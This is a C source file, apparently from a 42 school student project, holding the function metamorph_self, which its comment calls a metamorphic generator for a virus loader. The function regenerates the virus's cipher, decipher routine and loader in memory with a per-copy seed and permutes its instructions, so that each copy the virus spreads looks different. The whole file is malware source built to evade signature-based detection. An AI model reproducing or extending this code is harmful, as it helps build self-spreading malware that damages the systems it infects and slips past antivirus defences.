/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   metamorph_self.c                                   :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
/*   Updated: 2020/01/04 19:49:13 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "polymorphism.h"
#include "errors.h"
#include "loader.h"

/*
** metamorph_self is a metamorphic generator for the virus loader.
**   It works by regenerating its own loader
**   (overwriting the one that is loaded in memory)
**   before it is copied by our virus later on.
*/

bool		metamorph_self(uint64_t son_seed[2], uint64_t client_id)
{
	uint64_t	unique_seed = polymorphic_seed_engine(son_seed, client_id);
	size_t		cypher_size = (size_t)cypher_end - (size_t)cypher;
	size_t		loader_size = loader_exit - loader_entry;

	if (!generate_cypher((void *)cypher, unique_seed, cypher_size)
	|| !generate_decypher((void *)decypher, unique_seed, cypher_size)
	|| !permutate_instructions(loader_entry, unique_seed, loader_size)
	// || !permutate_registers(loader_entry, unique_seed, loader_size)
	|| !true) // add more metamorphosis above!
		return errors(ERR_THROW, _ERR_METAMORPH_SELF);

	return true;
}
